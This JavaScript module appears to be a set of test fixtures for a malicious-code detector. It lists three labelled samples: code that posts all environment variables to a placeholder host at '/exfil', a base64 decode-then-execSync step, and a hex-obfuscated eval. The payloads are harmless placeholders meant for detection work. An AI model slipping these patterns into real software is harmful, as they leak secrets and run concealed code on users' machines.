module.exports = [
  {
    name: "Environment data exfiltration pattern",
    file: "utils/tracker.js: request body construction",
    source: String.raw`const data = JSON.stringify(process.env);
const req = https.request({ hostname: "example.invalid", method: "POST", path: "/exfil" });
req.write(data);
req.end();`,
  },
  {
    name: "Decode then execute pattern",
    file: "scripts/installer.js: payload handling",
    source: String.raw`const { execSync } = require("child_process");
const payload = "ZWNobyBiZW5jaG1hcmstb25seQ==";
execSync(Buffer.from(payload, "base64").toString("utf-8"));`,
  },
  {
    name: "Obfuscated dynamic evaluation pattern",
    file: "utils/loader.js: dynamic evaluation",
    source: String.raw`const encodedCode = "\x65\x76\x61\x6c\x28\x31\x20\x2b\x20\x31\x29";
eval(encodedCode);`,
  },
];